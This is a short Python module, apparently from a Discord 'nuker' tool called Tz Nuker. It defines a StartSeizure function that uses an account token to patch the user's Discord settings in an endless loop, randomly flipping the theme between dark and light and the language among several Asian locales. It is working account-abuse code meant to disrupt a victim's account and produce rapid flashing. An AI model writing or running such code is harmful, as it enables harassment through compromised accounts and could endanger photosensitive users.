# Esse self foi orgulhosamente codificado por Rdimo (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Nuker sob a Licença Pública Geral GNU v2 (1991).

import requests
import random

from util.plugins.common import getheaders

def StartSeizure(token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)